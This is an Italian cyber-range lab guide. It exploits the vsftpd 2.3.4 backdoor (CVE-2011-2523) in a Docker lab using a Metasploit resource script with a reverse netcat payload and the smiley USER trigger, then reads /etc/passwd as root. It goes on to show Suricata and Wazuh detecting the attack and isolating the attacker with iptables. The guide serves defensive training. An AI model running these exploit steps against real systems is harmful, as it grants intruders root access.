# Attack Guide — CVE-2011-2523 vsftpd 2.3.4 Backdoor

## La vulnerabilità

**CVE-2011-2523** riguarda vsftpd 2.3.4, un server FTP molto diffuso su sistemi Linux. Nel 2011 il server di distribuzione ufficiale fu compromesso e fu pubblicata una versione contenente una backdoor malevola.

**Meccanismo:** quando un client FTP invia un username contenente la sequenza `:)` (smiley), vsftpd esegue silenziosamente una fork del processo e apre una shell root in ascolto sulla porta TCP **6200**. L'attaccante si collega quindi a quella porta ottenendo accesso root completo al sistema.

**Impatto CIA:**
- **Confidenzialità** — accesso root a tutti i file del sistema
- **Integrità** — possibilità di modificare qualsiasi file
- **Disponibilità** — possibilità di terminare qualsiasi servizio

---

## Prerequisiti

- Ambiente avviato con `docker compose up -d --build`
- Tutti i container in stato `running` (`docker compose ps`)
- Wazuh agent `defense-nids` connesso e Active (`docker exec wazuh-manager /var/ossec/bin/agent_control -l`)

---

## Fase 1 — Reconnaissance

Verifica che il servizio FTP vulnerabile sia attivo sulla vittima:

```bash
docker exec attacker nmap -sV -p 21 10.0.2.10
```

Output atteso:

```
21/tcp open  ftp     vsftpd 2.3.4
```

La versione 2.3.4 è quella contenente la backdoor.

---

## Fase 2 — Exploitation automatica (Metasploit)

Lo script `exploit.rc` automatizza l'intero processo:

```bash
docker exec attacker msfconsole -q -r /exploits/03-cve-metasploit/exploit.rc
```

Contenuto dello script:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.10
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 10.0.1.10
exploit -z
```

**Cosa accade durante l'esecuzione:**

1. Metasploit proba la porta 6200 (verifica se il backdoor è già aperto)
2. Invia il trigger FTP: `USER anonymous:)` — lo smiley attiva la backdoor
3. vsftpd apre la porta 6200 sul sistema vittima
4. Metasploit si collega alla porta 6200 e ottiene la shell root
5. La shell esegue `netcat` per creare una reverse shell verso l'attaccante

**Output atteso:**

```
[*] 10.0.2.10:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.10:21 - USER: 331 Please specify the password.
[+] 10.0.2.10:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.10:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

---

## Fase 3 — Verifica accesso ottenuto

Dalla sessione Metasploit ottenuta, verificare i privilegi:

```
id
whoami
cat /etc/passwd | head -5
```

Output atteso: `uid=0(root) gid=0(root) groups=0(root)`

---

## Fase 4 — Osservare la risposta difensiva

Subito dopo l'exploit, il sistema di difesa interviene automaticamente.

### Suricata (NIDS)

```bash
docker exec defense cat /var/log/suricata/fast.log
```

Righe attese:

```
[1:9000002:1] EXPLOIT vsftpd 2.3.4 Backdoor Shell Connection on port 6200  {TCP} 10.0.1.10 -> 10.0.2.10:6200
[1:9000001:1] EXPLOIT vsftpd 2.3.4 Backdoor Trigger - smiley in FTP USER   {TCP} 10.0.1.10 -> 10.0.2.10:21
```

### Wazuh (HIDS + correlazione)

```bash
docker exec wazuh-manager bash -c "grep -E 'Rule: 100001|Rule: 100002' /var/ossec/logs/alerts/alerts.log"
```

Alert attesi:
- `Rule: 100002 (level 15)` — connessione porta 6200 (probe pre-trigger)
- `Rule: 100001 (level 12)` — trigger FTP con smiley → attiva Active Response

### Active Response (blocco iptables)

```powershell
docker exec defense bash -c "iptables -L INPUT -n | grep 10.0.1.10"
docker exec defense bash -c "iptables -L FORWARD -n | grep 10.0.1.10"
```

Atteso: regola `DROP` per `10.0.1.10` su entrambe le chain.

### Verifica isolamento attaccante

```bash
docker exec attacker ping -c 4 10.0.2.10
```

Atteso: `4 packets transmitted, 0 received, 100% packet loss`

---

## Timeline dell'attacco

| Tempo | Evento |
|---|---|
| t+0s | Metasploit invia probe su porta 6200 → SID 9000002 × 2 → Wazuh regola 100002 |
| t+7s | Metasploit invia `USER :)` → SID 9000001 → Wazuh regola 100001 (level 12) |
| t+7s | Active Response avviata: `custom-firewall-drop` eseguito su `defense` |
| t+8s | iptables DROP aggiunto per 10.0.1.10 su INPUT e FORWARD |
| t+8s | Connessione reverse shell caduta — attaccante isolato |

---

## Riferimenti

- [NVD CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Metasploit Module: exploit/unix/ftp/vsftpd_234_backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- MITRE ATT&CK: [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
